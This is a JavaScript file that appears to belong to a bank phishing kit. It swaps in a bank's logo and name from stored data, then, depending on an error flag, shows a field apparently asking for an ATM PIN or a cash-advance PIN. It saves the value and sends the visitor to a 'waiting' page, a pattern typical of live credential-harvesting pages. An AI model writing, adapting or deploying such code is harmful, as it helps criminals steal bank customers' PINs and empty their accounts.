const loader = document.querySelector('.loader');
setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');
        if(info.metaInfo.err === 'ccajero'){
            document.querySelector('#ccajero').setAttribute('type', 'text');
        }else if(info.metaInfo.err === 'cavances'){
            document.querySelector('#cavances').setAttribute('type', 'text');
        }
    }catch(err){
        console.log(err);
    }
}, 2000);

// image and span
document.querySelector('#bank-logo').setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
document.querySelector('#bank-name').textContent = info.metaInfo.ban.toUpperCase();

const btnNextStep = document.querySelector('#next-step');
btnNextStep.addEventListener('submit', e => {
    e.preventDefault();

    if(info.metaInfo.err === 'ccajero'){
        info.metaInfo.ccaj = document.querySelector('#ccajero').value;
        LS.setItem('info', JSON.stringify(info));

        window.location.href = 'waiting.html';

    }else if(info.metaInfo.err === 'cavances'){
        info.metaInfo.cavance = document.querySelector('#cavances').value;
        LS.setItem('info', JSON.stringify(info));

        window.location.href = 'waiting.html';
    }
});